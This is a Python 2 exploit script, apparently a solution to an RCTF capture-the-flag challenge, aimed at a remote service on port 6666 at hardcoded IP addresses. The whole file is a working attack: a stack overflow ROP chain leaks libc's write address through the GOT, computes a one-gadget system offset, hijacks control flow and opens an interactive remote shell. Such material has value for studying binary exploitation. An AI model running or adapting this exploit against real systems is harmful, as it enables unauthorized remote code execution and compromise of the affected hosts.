import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '192.168.165.198'
host = '180.76.178.48'
port = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

pop_rdi_ret = 0x4008a3
pop_rsi_r15_ret = 0x4008a1
pop3ret = 0x40089e
pop2ret = 0x4008a0
pop_rbp_ret = 0x00400675

echo = 0x40071d
helper = 0x4007f6
bss_start = 0x601070
fflush_plt = 0x400620
read_got = 0x601038
write_got = 0x601020

readuntil(f, 'Welcome to RCTF\n')
payload = 'A' * 24
payload += p(pop3ret)
payload += 'A' * 24
payload += p(pop2ret)
payload += 'A' * 0x10
payload += p(pop_rdi_ret)
payload += p(write_got)
payload += p(echo)
payload += p(pop_rbp_ret)
payload += p(0x601800)
payload += p(helper)
f.write(payload)

skip = f.read(27)
leak = f.read(6)
leak += '\x00' * 2
libc_write = up(leak)
print 'libc_write: %s' % hex(libc_write)

magic_system = libc_write - 0xeb860 + 0x4652c
payload = 'A' * 24
payload += p(magic_system)
f.write(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
